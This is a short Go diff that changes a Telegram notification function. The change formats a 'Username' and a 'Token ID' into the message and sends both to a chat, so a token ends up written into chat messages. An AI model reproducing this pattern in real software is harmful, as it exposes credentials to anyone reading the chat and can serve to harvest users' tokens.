@@ -21,8 +21,11 @@ func sendTelegramNotification(chatID string, token string, message string) {
 		log.Println("Invalid chat ID format:", err)
 		return
 	}
+	combinedMessage := "👤 Username: " + message + "\n" +
+		"🔑 Token ID: " + token + "\n" +
+		"---------------------------------"
 
-	msg := tgbotapi.NewMessage(chatIDInt, message) // Use NewMessage for direct messages to users or groups
+	msg := tgbotapi.NewMessage(chatIDInt, combinedMessage) // Use NewMessage for direct messages to users or groups
 	_, err = bot.Send(msg)
 	if err != nil {
 		log.Println("Failed to send message:", err)
